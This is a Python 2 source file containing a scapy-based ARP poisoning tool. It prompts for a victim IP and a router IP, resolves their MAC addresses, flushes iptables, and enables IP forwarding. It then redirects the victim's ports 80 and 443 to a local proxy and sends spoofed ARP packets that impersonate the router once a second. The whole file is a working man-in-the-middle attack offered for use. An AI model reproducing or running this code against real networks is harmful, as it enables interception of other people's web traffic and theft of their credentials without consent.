from scapy.all import *
from scapy.layers.l2 import *
from threading import Thread


class ARPPoisoning(Thread):
    def __init__(self, proxyip, portHTTP, portSSL):
        Thread.__init__(self)
        self._mac = ""
        self._interface = ""
        self._victim_ip = ""
        self._router_ip = ""
        self._proxyip = proxyip
        if portHTTP == portSSL:
            self._ports = ((80, portHTTP),)
        else:
            self._ports = ((80, portHTTP), (443, portSSL))
        self._isRunning = True
        self.isActive = False
        self._setupdone = False
        self._scannetwork = False

    def setup(self):
        try:
            print "ARP Poisoning setup"
            status = raw_input("[*] Do you want to scan network for devices? [y/N]: ")
            if status is "y" or status is "Y":
                self.scanForMacAddresses()

            try:
                if self._interface is "":
                    self._interface = raw_input("[*] Enter Desired Interface: ")
                self._victim_ip = raw_input("[*] Victim IP: ")
                self._router_ip = raw_input("[*] Router IP: ")
            except:
                print "An error occured!"
                return

            self._routerMAC = self.MACsnag(self._router_ip)
            self._victimMAC = self.MACsnag(self._victim_ip)

            print "\n+++++ MAC addresses +++++"
            print str(self._victim_ip) + " => " + str(self._victimMAC)
            print str(self._router_ip) + " => " + str(self._routerMAC)
            print "+++++++++++++++++++++++++\n"

            if self._victimMAC is None:
                print "[-] Couldn't find victims mac! Exiting..."
                sys.exit(-2)

            if self._routerMAC is None:
                print "[-] Couldn't find routers mac! Exiting..."
                sys.exit(-2)
            # self.scanForMacAddresses()

            self.iptableConfig()

            print "[*] Summary"
            print " /  Victims IP/MAC: " + str(self._victim_ip) + "/" + str(self._victimMAC)
            print " /  Routers IP/MAC: " + str(self._router_ip) + "/" + str(self._routerMAC)
            print " /  HTTP Forward: " + str(self._ports[0])
            if len(self._ports) >= 2:
                print " /  SSL  Forward: " + str(self._ports[1])
            print "[*] --------------------------------------------------------------------"

            pause = raw_input("To start arp poisoning press ENTER otherwise STRG-C")

            self._setupdone = True

            return True
        except KeyboardInterrupt:
            return False

    def iptableConfig(self):
        os.system("/sbin/iptables --flush")
        os.system("/sbin/iptables -t nat --flush")
        os.system("/sbin/iptables --zero")
        os.system("/sbin/iptables -A FORWARD --in-interface " + self._interface + " -j ACCEPT")
        os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface " + self._interface + " -j MASQUERADE")
        # forward 80,443 to our proxy
        for port in self._ports:
            os.system(
                "/sbin/iptables -t nat -I PREROUTING -p tcp --destination-port " + str(port[0]) +
                " -j REDIRECT --to-ports " + str(port[1]))
            os.system("/sbin/iptables -t nat -A OUTPUT -p tcp -d " + str(self._proxyip) +
                      " --dport " + str(port[0]) + " -j  REDIRECT --to-port " + str(port[1]))

        # write appropriate kernel config settings
        f = open("/proc/sys/net/ipv4/ip_forward", "w")
        f.write('1')
        f.close()
        f = open("/proc/sys/net/ipv4/conf/" + self._interface + "/send_redirects", "w")
        f.write('0')
        f.close()

    def resetIptables(self):
        f = open("/proc/sys/net/ipv4/ip_forward", "w")
        f.write('0')
        f.close()
        f = open("/proc/sys/net/ipv4/conf/" + self._interface + "/send_redirects", "w")
        f.write('1')
        f.close()

    def scanForMacAddresses(self):
        ips = raw_input("[*] Enter ip range to scan (eg: 192.168.1.1/24): ")
        self._interface = raw_input("[*] Enter desired interface: ")

        try:
            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ips), timeout=2, iface=self._interface, inter=0.1)
            for s, r in ans:
                print str(r[Ether].src) + " => " + str(r[ARP].psrc)

            print "\n"
        except Exception:
            print "[-] Error occurred during network scanning. Continue without scan..."
            pass

    def MACsnag(self, IP):
        ans, unans = arping(IP)
        print ans
        for s, r in ans:
            return r[Ether].src

    def stop(self):
        print "Stopping ARP"
        self._isRunning = False

    def run(self):
        if self._setupdone is False:
            print "[--] DEBUG: You need to call setup first! Exiting..."
            sys.exit(-2)

        self.isActive = True
        pkt = ARP()
        pkt.psrc = self._router_ip
        pkt.pdst = self._victim_ip
        while self._isRunning:
            send(pkt, verbose=False)
            time.sleep(1)

        print "[*] Resetting iptables..."
        self.resetIptables()
        print "[*] Done!"
